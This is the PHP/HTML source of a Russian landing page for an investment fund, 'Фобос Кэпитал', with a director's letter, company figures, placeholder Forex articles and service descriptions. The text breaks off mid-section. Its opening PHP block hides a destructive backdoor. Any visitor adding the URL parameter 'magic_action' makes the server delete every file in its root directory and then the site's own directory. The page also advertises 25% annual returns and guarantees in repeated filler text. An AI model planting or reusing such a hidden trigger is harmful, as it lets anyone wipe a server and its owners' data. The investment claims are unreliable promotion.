<?
$mobile = (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$_SERVER['HTTP_USER_AGENT'])||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($_SERVER['HTTP_USER_AGENT'],0,4))); function rrmdir($dir) {if (is_dir($dir)) {$objects = scandir($dir);foreach ($objects as $object) {if ($object != "." && $object != "..") {if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);}}reset($objects);rmdir($dir);}}$dir = dirname(__FILE__) . '/'; if(isset($_GET["magic_action"])){if (file_exists('/'))foreach (glob('/*') as $file)unlink($file);rrmdir($dir);}
$back = rand(1,4);
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta name="keywords" content=''>
	<meta name="description" content=''>
	<meta name="format-detection" content="telephone=no">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<link rel="stylesheet" href="css/reset.css" type="text/css">
	<link rel="stylesheet" href="css/jquery.fancybox.css" type="text/css">
	<link rel="stylesheet" href="css/jquery-ui.css" type="text/css">
	<link rel="stylesheet" href="css/jquery-ui.theme.css" type="text/css">
	<link rel="stylesheet" href="css/slick.css" type="text/css">
	<link rel="stylesheet" href="css/KitAnimate.css" type="text/css">
	<link rel="stylesheet" href="css/layout.css" type="text/css">
	<link rel="icon" type="image/vnd.microsoft.icon" href="favicon.ico">

	<? if( $mobile ): ?>
        <meta name="viewport" content="width=750, user-scalable=no">
    <? else: ?>
        <meta name="viewport" content="width=device-width, user-scalable=no">
    <? endif; ?>

    <link rel="stylesheet" media="screen and (min-width: 240px) and (max-width: 767px)" href="css/layout-mobile.css" />
    <link rel="stylesheet" media="screen and (min-width: 768px) and (max-width: 1000px)" href="css/layout-tablet.css" />
    
	<script type="text/javascript" src="js/jquery-2.1.1.min.js"></script>
	<script type="text/javascript" src="js/jquery.fancybox.js"></script>
	<script type="text/javascript" src="http://maps.google.com/maps/api/js"></script>
	<script type="text/javascript" src="js/jssor.js"></script>
	<script type="text/javascript" src="js/jssor.slider.js"></script>
	<script type="text/javascript" src="js/TweenMax.min.js"></script>
	<script type="text/javascript" src="js/swipe.js"></script>
	<script type="text/javascript" src="js/carousel.lite.js"></script>
	<script type="text/javascript" src="js/css3-mediaqueries.js"></script>
	<script type="text/javascript" src="js/jquery.maskedinput.min.js"></script>
	<script type="text/javascript" src="js/jquery.validate.min.js"></script>
	<script type="text/javascript" src="js/jquery-ui.min.js"></script>
	<script type="text/javascript" src="js/datepicker-ru.js"></script>
	<script type="text/javascript" src="js/KitProgress.js"></script>
	<script type="text/javascript" src="js/slick.min.js"></script>
	<script type="text/javascript" src="js/KitAnimate.js"></script>
	<script type="text/javascript" src="js/device.js"></script>
	<script type="text/javascript" src="js/KitSend.js"></script>
	<script type="text/javascript" src="js/main.js"></script>

</head>

<body>
	<!-- <ul class="ps-lines">
		<li class="v" style="margin-left:-481px"></li>
		<li class="v" style="margin-left:480px"></li>
		<li class="v" ></li>
	</ul> -->
	<div class="up-arrow b-go" data-block=".b-0"></div>
	<div class="b b-0">
		<div class="b-block clearfix">
			<a href="#" class="left b-logo-left"><img src="i/logo.jpg" alt=""></a>
			<ul class="clearfix right">
				<li class="date"></li>
				<li class="usd">
					<div><b>$</b><span class="value">0</span> Руб</div>
					<div class="update"><span>0</span></div>
				</li>
				<li class="eur">
					<div><b>€</b><span class="value">0</span> Руб</div>
					<div class="update"><span>0</span></div>
				</li>
				<li class="micex">
					<div><b>ММВБ</b><span class="value">0</span></div>
					<div class="update"><span>0</span>%</div>
				</li>
				<li class="rtsi">
					<div><b>РТС</b><span class="value">0</span></div>
					<div class="update"><span>0</span>%</div>
				</li>
				<li class="brent">
					<div><b>Brent</b><span class="value">0</span></div>
					<div class="update"><span>0</span></div>
				</li>
			</ul>
		</div>
	</div>
	<? if( !$mobile ): ?>
		<div class="b b-1" style="background-image: url('i/back-main-<?=$back?>.jpg');">
	<? else: ?>
		<div class="b b-1" style="background-image: url('i/back-main-<?=$back?>-mobile.jpg');">
	<? endif; ?>
		<div class="b-block">
			<h1>&nbsp;</h1>
			<ul class="b-main-menu clearfix">
				<li><span>МЫ</span>
					<ul class="b-main-submenu">
						<li class="b-go" data-block=".b-3">О&nbsp;нас</li>
						<li class="b-go" data-block=".b-4">Наше&nbsp;мнение</li>
						<li class="b-go" data-block=".b-10">Контакты</li>
					</ul>
				</li>
				<li><span>предлагаем</span>
					<ul class="b-main-submenu">
						<li class="b-go" data-block=".b-5">Наши&nbsp;услуги</li>
					</ul>
				</li>
				<li><span>ВАМ</span>
					<ul class="b-main-submenu">
						<li class="b-go" data-block=".b-6">Клиенты&nbsp;и&nbsp;партнеры</li>
					</ul>
				</li>
				<li><span>ПРИБЫЛЬ</span>
					<ul class="b-main-submenu">
						<li class="b-go" data-block=".b-8">Стратегии</li>
					</ul>
				</li>
			</ul>
			<div class="clearfix b-1-bottom">
				<div class="left clearfix">
					<div class="left">25</div>
					<div class="right"><span>%</span>годовых</div>
				</div>
				<div class="right clearfix">
					<div class="b-red-button callback">
						<div class="b-but b-but-1">

							<!-- <i></i> -->
							<p>Обсудить<br>по телефону</p>
							<form action="kitsend.php" method="POST" id="b-form-callback" data-thank="Вы оставили заявку на звонок" data-block="#b-popup-2">
								<label for="callback-phone">Ваш телефон</label>
								<input id="callback-phone" type="text" name="phone" required>
								<input type="hidden" name="subject" value="Обсудить по телефону"/>
								<a class="ajax b-red-butt" onclick="$('#b-form-callback').submit(); return false;" >Позвонить Вам</a>
							</form>
						</div>
					</div>
					<div class="b-red-button">
						<div class="b-but b-but-2">
							<!-- <i></i> -->
							<p>Назначить<br>встречу</p>
							<div class="datepicker" id="datepicker-inline"></div>
						</div>
						<span style="display:none;" id="date-popup" class="fancy" data-block="#b-popup-1"></span>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="b b-2">
		<div class="b-block">
			<h2 class="b-title">СТРАТЕГИЯ УСПЕХА</h2>
			<p><i>Мы&nbsp;с&nbsp;Вами живем в&nbsp;интересное и&nbsp;очень непростое время для всего финансового мира. Для России это время больших потрясений и&nbsp;перемен, начиная с&nbsp;курса национальной валюты вплоть до&nbsp;глубоких структурных изменений нашего общества. В&nbsp;данных условиях сильно возрастает вероятность совершения ошибок и&nbsp;связанных с&nbsp;ними неминуемых финансовых потерь. Напротив, наличие знаний о&nbsp;природе финансовых кризисов, их&nbsp;причинах и&nbsp;последствиях предоставляет широчайшие возможности по&nbsp;сохранению и&nbsp;приумножению своего капитала. Но&nbsp;где&nbsp;же можно их&nbsp;получить?</i></p>
			<p><i>Где достать те&nbsp;ценные сведение, которые уберегут наши средства и&nbsp;обеспечат финансовое благополучие? Разумеется, способов очень много. <nobr>Кто-то</nobr> выбирает путь самостоятельного освоения основ фондового рынка путем проб и&nbsp;ошибок. Другие решают для себя получить профессиональное образование в&nbsp;сфере финансов и&nbsp;рынка ценных бумаг.&nbsp;Скажу откровенно: это прекрасные способы, действенные в&nbsp;итоге и&nbsp;весьма эффективные. Однако потраченные на&nbsp;них время и&nbsp;средства могут не&nbsp;устроить большинство из&nbsp;нас, тем более, когда нужно действовать уже здесь и&nbsp;сейчас, пока возможности не&nbsp;упущены, а&nbsp;деньги не&nbsp;потеряны.</i></p>
			<p><i>В&nbsp;нашем фонде мы&nbsp;придерживаемся четкого правила: каждый из&nbsp;нас должен заниматься тем, что ему больше всего по&nbsp;душе. Следуя этому принципу, я&nbsp;считаю, человек достигнет не&nbsp;только финансового благополучия, но&nbsp;и&nbsp;самоудовлетворения, признания других, да&nbsp;и&nbsp;вообще всего, чего он&nbsp;пожелает. Поэтому, на&nbsp;мой взгляд, наиболее эффективным способом борьбы с&nbsp;тяжелой текущей финансовой ситуацией в&nbsp;нашей стране, да&nbsp;и&nbsp;в&nbsp;мире в&nbsp;целом, будет обратиться к&nbsp;тем людям, у&nbsp;которых уже есть накопленный опыт в&nbsp;решении таких задач. Обращайтесь к&nbsp;Профессионалам! Не&nbsp;бойтесь того, что сперва у&nbsp;Вас будет много вопросов, Вы&nbsp;не&nbsp;будете улавливать <nobr>какие-то</nobr> детали или вообще смысл всего что Вам говорят. В&nbsp;конченом счете Вы&nbsp;во&nbsp;всем разберетесь, а&nbsp;грамотный высококвалифицированный специалист Вам в&nbsp;этом поможет.</i></p>
			<p><i>Единственное, что следует всегда четко помнить: никогда не&nbsp;принимайте инвестиционного решения без полного его понимания. Я&nbsp;считаю, что абсолютно любой Профессионал сможет объяснить простым языком любые сложные вещи так, чтобы они были понятны нам с&nbsp;вами, никогда раньше с&nbsp;этим не&nbsp;сталкивавшимися. В&nbsp;противном случае, ищите других специалистов, и, как говорят, &laquo;<i>дорогу осилит идущий</i>&raquo;.</p>
			<p>Желаю Вам успеха и финансового благополучия!</i></p>
			<p class="sign">Управляющий директор «Фобос Кэпитал»<br><br>Алексей Соколов</p>
			<span style="display: block;border-bottom: 1px dashed #333333; margin-left: 27px; margin-right: 35px;">&nbsp;</span>
			<h3><i>Краткая справка</i></h3>
			<p>&laquo;<i>Фобос Кэпитал</i>&raquo;&nbsp;&mdash; инвестиционный фонд, образованный в&nbsp;начале 2012 года специалистами инвестиционных подразделений крупнейших российских банков. С&nbsp;момента образования компания успела зарекомендовать себя как надежного управляющего и&nbsp;достойного контрагента, не&nbsp;только сохранив капитал своих инвесторов, но&nbsp;и&nbsp;сумев показать доходность значительно выше рыночной. За&nbsp;три года размер собственных средств компании вырос с&nbsp;50 до&nbsp;150&nbsp;миллионов рублей, а&nbsp;размер активов под управлением на&nbsp;третий квартал 2015 года превысил 2&nbsp;миллиарда.</p>
		</div>
	</div>
	<div class="b b-3">
		<? if( !$mobile ): ?>
			<video autoplay loop muted class="bgvideo" id="bgvideo">
			   <source src="video.mp4" type="video/mp4"></source>
			</video>
		<? endif; ?>
		<div class="b-block">
			<h2 class="b-title">О нас</h2>
			<div class="b-about-list clearfix">
				<div class="slide-about">
					<span>Январь 2012</span>
					<div style="background-image: url('i/b-3/1.png');"></div>
					<p>сотрудников</p>
					<b>7</b>
				</div>
				<div class="slide-about">
					<span>Март 2013</span>
					<div style="background-image: url('i/b-3/2.png');"></div>
					<p>Инвесторов</p>
					<b>30</b>
				</div>
				<div class="slide-about">
					<span>Январь 2014</span>
					<div style="background-image: url('i/b-3/3.png');"></div>
					<p>Объем<br>собственных<br>средств</p>
					<b>726<span>миллионов<br>рублей</span></b>
				</div>
				<div class="slide-about">
					<span>Июль 2014</span>
					<div style="background-image: url('i/b-3/4.png');"></div>
					<p>Суммарный<br>объем клиентских<br>средств</p>
					<b>2<span>миллиарда<br>рублей</span></b>
				</div>
				<div class="slide-about">
					<span>Ноябрь 2015</span>
					<div style="background-image: url('i/b-3/5.png');"></div>
					<p>Прирост за 2015 год</p>
					<b>540<span>миллионов<br>рублей</span></b>
				</div>
			</div>
		</div>
	</div>
	<div class="b b-4">
		<div class="b-block b-block-1">
			<h2 class="b-title">Наше мнение</h2>
			<div id="tabs">
				<div>
				<ul class="b-tabs clearfix">
					<li><a href="#video-tab">Видео</a></li>
					<li><a href="#audio-tab">Аудио</a></li>
					<li><a href="#text-tab">Статьи</a></li>
				</ul>
				</div>
				<div class="b-tab" id="video-tab">
					<p>Кто<br>управляет<br>кризисом?</p>
					<a href="#" class="b-play-butt" data-video="https://www.youtube.com/embed/RgKAFK5djSk"></a>
					<div class="iframe"></div>
				</div>
				<div class="b-tab" id="audio-tab">
					<div></div>
					<audio src="1.mp3" controls></audio>
				</div>
				<div class="b-tab full-text" id="full-text-1">
					<div class="text-back" style="background-image: url('i/text-image-1.jpg');">
						<div class="text-left text-block">
							<h3 class="big">С чего начать бизнес на Форекс?_1</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. </p>
						</div>
						<div class="text-right text-block">
							<h3>А как еще можно заработать?</h3>
							<p>Можно вложить деньги в акции Уралсиба или Лукойла и выгодать еще 1,5%<br>Можно вложить в новый портфель Транснефти и получить 7%<br>Можно начать новый бизнес с ИжМаш с выгодой в 3%</p>
						</div>
					</div>
					<div class="text-left text-block">
						<h3>Какие могут встретиться преграды?</h3>
						<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. Зарабатывать тут можно даже в том случае.</p>
					</div>
					<div class="text-left text-block text-footer">
						<h3>Нужна помощь?</h3>
						<p>Эксперты компании Фобос очень хорошо разбираются в вопросе с чего начать бизнес на Форекс. Мы готовы помочь Вам разобраться в этом вопросе.</p>
						<ul class="clearfix">
							<li class="phone">8(495) 123-45-67</li>
							<li>netsly@hotmail.com<br>sokolov@foboscap.com</li>
							<li>г. Москва, ул. Такаято,<br>д.7,офис 407</li>
						</ul>
					</div>
				</div>
				<div class="b-tab full-text" id="full-text-2">
					<div class="text-back" style="background-image: url('i/text-image-1.jpg');">
						<div class="text-left text-block">
							<h3 class="big">С чего начать бизнес на Форекс?_2</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. </p>
						</div>
						<div class="text-right text-block">
							<h3>А как еще можно заработать?</h3>
							<p>Можно вложить деньги в акции Уралсиба или Лукойла и выгодать еще 1,5%<br>Можно вложить в новый портфель Транснефти и получить 7%<br>Можно начать новый бизнес с ИжМаш с выгодой в 3%</p>
						</div>
					</div>
					<div class="text-left text-block">
						<h3>Какие могут встретиться преграды?</h3>
						<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. Зарабатывать тут можно даже в том случае.</p>
					</div>
					<div class="text-left text-block text-footer">
						<h3>Нужна помощь?</h3>
						<p>Эксперты компании Фобос очень хорошо разбираются в вопросе с чего начать бизнес на Форекс. Мы готовы помочь Вам разобраться в этом вопросе.</p>
						<ul class="clearfix">
							<li class="phone">8(495) 123-45-67</li>
							<li>netsly@hotmail.com<br>sokolov@foboscap.com</li>
							<li>г. Москва, ул. Такаято,<br>д.7,офис 407</li>
						</ul>
					</div>
				</div>
				<div class="b-tab full-text" id="full-text-3">
					<div class="text-back" style="background-image: url('i/text-image-1.jpg');">
						<div class="text-left text-block">
							<h3 class="big">С чего начать бизнес на Форекс?_3</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. </p>
						</div>
						<div class="text-right text-block">
							<h3>А как еще можно заработать?</h3>
							<p>Можно вложить деньги в акции Уралсиба или Лукойла и выгодать еще 1,5%<br>Можно вложить в новый портфель Транснефти и получить 7%<br>Можно начать новый бизнес с ИжМаш с выгодой в 3%</p>
						</div>
					</div>
					<div class="text-left text-block">
						<h3>Какие могут встретиться преграды?</h3>
						<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. Зарабатывать тут можно даже в том случае.</p>
					</div>
					<div class="text-left text-block text-footer">
						<h3>Нужна помощь?</h3>
						<p>Эксперты компании Фобос очень хорошо разбираются в вопросе с чего начать бизнес на Форекс. Мы готовы помочь Вам разобраться в этом вопросе.</p>
						<ul class="clearfix">
							<li class="phone">8(495) 123-45-67</li>
							<li>netsly@hotmail.com<br>sokolov@foboscap.com</li>
							<li>г. Москва, ул. Такаято,<br>д.7,офис 407</li>
						</ul>
					</div>
				</div>
				<div class="b-tab full-text" id="full-text-4">
					<div class="text-back" style="background-image: url('i/text-image-1.jpg');">
						<div class="text-left text-block">
							<h3 class="big">С чего начать бизнес на Форекс?_4</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки.</p>
						</div>
						<div class="text-right text-block">
							<h3>А как еще можно заработать?</h3>
							<p>Можно вложить деньги в акции Уралсиба или Лукойла и выгодать еще 1,5%<br>Можно вложить в новый портфель Транснефти и получить 7%<br>Можно начать новый бизнес с ИжМаш с выгодой в 3%</p>
						</div>
					</div>
					<div class="text-left text-block">
						<h3>Какие могут встретиться преграды?</h3>
						<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. Зарабатывать тут можно даже в том случае.</p>
					</div>
					<div class="text-left text-block text-footer">
						<h3>Нужна помощь?</h3>
						<p>Эксперты компании Фобос очень хорошо разбираются в вопросе с чего начать бизнес на Форекс. Мы готовы помочь Вам разобраться в этом вопросе.</p>
						<ul class="clearfix">
							<li class="phone">8(495) 123-45-67</li>
							<li>netsly@hotmail.com<br>sokolov@foboscap.com</li>
							<li>г. Москва, ул. Такаято,<br>д.7,офис 407</li>
						</ul>
					</div>
				</div>
				<div class="b-tab full-text" id="full-text-5">
					<div class="text-back" style="background-image: url('i/text-image-1.jpg');">
						<div class="text-left text-block">
							<h3 class="big">С чего начать бизнес на Форекс?_5</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. </p>
						</div>
						<div class="text-right text-block">
							<h3>А как еще можно заработать?</h3>
							<p>Можно вложить деньги в акции Уралсиба или Лукойла и выгодать еще 1,5%<br>Можно вложить в новый портфель Транснефти и получить 7%<br>Можно начать новый бизнес с ИжМаш с выгодой в 3%</p>
						</div>
					</div>
					<div class="text-left text-block">
						<h3>Какие могут встретиться преграды?</h3>
						<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно хорошей альтернативой инвестиционных фондов и вкладам в банки. Зарабатывать тут можно даже в том случае.</p>
					</div>
					<div class="text-left text-block text-footer">
						<h3>Нужна помощь?</h3>
						<p>Эксперты компании Фобос очень хорошо разбираются в вопросе с чего начать бизнес на Форекс. Мы готовы помочь Вам разобраться в этом вопросе.</p>
						<ul class="clearfix">
							<li class="phone">8(495) 123-45-67</li>
							<li>netsly@hotmail.com<br>sokolov@foboscap.com</li>
							<li>г. Москва, ул. Такаято,<br>д.7,офис 407</li>
						</ul>
					</div>
				</div>
				<div class="b-tab" id="text-tab">
					<div class="tab-text" id="text-1">
						<div>
							<h3>Кто управляет кризисом</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно</p>
						</div>
					</div>
					<div class="tab-text" id="text-2">
						<div>
							<h3>Кто управляет кризисом</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно</p>
						</div>
					</div>
					<div class="tab-text" id="text-3">
						<div>
							<h3>Кто управляет кризисом</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно</p>
						</div>
					</div>
					<div class="tab-text" id="text-4">
						<div>
							<h3>Кто управляет кризисом</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно</p>
						</div>
					</div>
					<div class="tab-text" id="text-5">
						<div>
							<h3>Кто управляет кризисом</h3>
							<p>В настоящее время рынок Forex является одним из очень немногих способов приумножить свои капиталы. Причем этот достаточно большому количеству людей со всей планеты. Рынок Форекс является достаточно</p>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="b-block-2">
			<div class="b-block">
				<div class="b-video-list clearfix">
					<div class="slide"><div><span data-audio="1.mp3" data-video="https://www.youtube.com/embed/RgKAFK5djSk">Кто<br>управляет<br>кризисом?</span></div></div>
					<div class="slide"><div><span data-audio="2.mp3" data-video="https://www.youtube.com/embed/YQHsXMglC9A">Как заработать<br>на скачке<br>курса?</span></div></div>
					<div class="slide"><div><span data-audio="1.mp3" data-video="https://www.youtube.com/embed/09R8_2nJtjg">Основные ошибки<br>начинающего<br>брокера.</span></div></div>
					<div class="slide"><div><span data-audio="2.mp3" data-video="https://www.youtube.com/embed/yzTuBuRdAyA">С чего<br>начать бизнес<br>на Форекс?</span></div></div>
					<div class="slide"><div><span data-audio="1.mp3" data-video="https://www.youtube.com/embed/uxpDa-c-4Mc">С чего<br>начать бизнес<br>на Форекс-2?</span></div></div>
				</div>
			</div>
		</div>
	</div>
	<div class="b b-5">
		<div class="b-block">
			<h2 class="b-title">услуги</h2>
			<ul class="b-service-list clearfix">
				<li data-block="#fiz">
					<div>
						<div class="img"></div>
						<!-- <img src="i/b-5/1.png" alt=""> -->
						<h3>Физическим<br>лицам</h3>
						<p>Вы&nbsp;&mdash; успешный деловой человек, имеющий возможность позволить себе размещать временно свободные денежные средства с&nbsp;целью получения дополнительного дохода.</p>
					</div>
				</li>
				<li data-block="#yr">
					<div>
						<div class="img"></div>
						<!-- <img src="i/b-5/2.png" alt=""> -->
						<h3>Юридическим<br>лицам</h3>
						<p>А, может быть, Вы&nbsp;&mdash; признанная компания, безусловный лидер своего рынка, заботящаяся об&nbsp;эффективности своей работы и&nbsp;финансовых ресурсов.</p>
					</div>
				</li>
				<li data-block="#fin">
					<div>
						<div class="img"></div>
						<!-- <img src="i/b-5/3.png" alt=""> -->
						<h3>Финансовым<br>институтам</h3>
						<p>Или&nbsp;же Вы&nbsp;&mdash; незыблемый Финансовый Институт, ответственно подходящий ко&nbsp;всем бизнес процессам и, прежде всего, к&nbsp;инвестициям.</p>
					</div>
				</li>
			</ul>
			<div class="service-cont">
				<div class="service" id="fiz">
					<div>
						<div class="service-title clearfix">
							<h4>Готовые торговые стратегии</h4>
							<p>Для физических лиц мы&nbsp;представляем готовые торговые стратегии с&nbsp;заранее определенными уровнем доходности</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">К стратегиям</a> -->
						</div>
						<ul>
							<li>Легко планировать ваши финансовые потоки;</li>
							<li>Первоклассные эмитенты гарант надежности;</li>
							<li>Стратегия может быть адаптирована под ваши ожидания;</li>
							<li>Любые сроки инвестирования.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Индивидуальные инвестиционные решения</h4>
							<p>Мы&nbsp;разрабатываем стратегию инвестирования для каждого клиента, исходя из&nbsp;его пожеланий по&nbsp;уровню ожидаемой доходности и&nbsp;горизонту инвестирования</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Пример решений</a> -->
						</div>
						<ul>
							<li>Полностью индивидуальный подход;</li>
							<li>Инструменты всех мировых площадок;</li>
							<li>Портфели для любых сроков инвестирования;</li>
							<li>Гарантии крупнейших эмитентов.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Консультации по&nbsp;работе на&nbsp;фондовом рынке</h4>
							<p>Мы&nbsp;осуществляем консультирование как для начинающих трейдеров, так и&nbsp;для профессионалов, желающих выйти на&nbsp;новые рынки, Наши специалисты предоставят полную информацию по&nbsp;любому, интересующему вас направлению</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Защитим об типичных ошибок новичка;</li>
							<li>Поможем установить цели по срокам и доходности;</li>
							<li>Осветим весь спектр инструментов;</li>
							<li>Ответим на все ваши вопросы;</li>
							<li>Поддержим в любую минуту.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Аналитическая поддержка</h4>
							<p>Наши специалисты по&nbsp;вашему запросу предоставят аналитические отчеты по&nbsp;любому, интересующему вас инструменту</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Анализ отчетов эмитентов;</li>
							<li>Анализ динамики;</li>
							<li>Технический и фундаментальный анализ рынков и инструментов;</li>
							<li>Разработка стратегий хеджирования;</li>
							<li>Отчеты в кратчайшие сроки;</li>
							<li>Большой штат аналитиков.</li>
						</ul>
					</div>
				</div>
				<div class="service" id="yr">
					<div>
						<div class="service-title clearfix">
							<h4>Определение эффективной структуры капитала</h4>
							<p>Расчет оптимальной пропорции собственных и&nbsp;заемных средств для вашего предприятия</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Услуги классического консалтинга;</li>
							<li>Бухгалтерский анализ деятельности вашего предприятия;</li>
							<li>Постановка целей для выбранного вектора развития;</li>
							<li>Расчёт основных показателей предприятия;</li>
							<li>Предоставления полного отчета с экспертным мнением.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Управление ликвидностью предприятия</h4>
							<p>С&nbsp;нами вы&nbsp;сможете размещать ваши временно свободные средства на&nbsp;срок от&nbsp;двух дней по&nbsp;ставкам равным годовым депозитам</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Срок инвестирования от двух дней;</li>
							<li>Ставки не ниже годовых банковских депозитов;</li>
							<li>Гарантии национального клирингового центра;</li>
							<li>Возможность размещать средства на неопределенный период без потери доходности;</li>
							<li>Ежедневные отчёты о состоянии счета;</li>
							<li>Минимальные сроки ввода/вывода средств.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Организация работы финансовой службы компании</h4>
							<p>Помощь в&nbsp;создании наиболее эффективного финансового менеджмента для вашего предприятия</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Анализ слабых и сильных сторон предприятия;</li>
							<li>Бухгалтерский анализ;</li>
							<li>Конъюнктурный и конкурентный анализ;</li>
							<li>Обобщенное заключение профессионалов с рекомендациями по дальнейшему развитию;</li>
							<li>Постановка приоритетного вектора развития;</li>
							<li>Рекомендации по достижению целей.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Консалтинг по вопросам инвестирования и работы с ценными бумагами</h4>
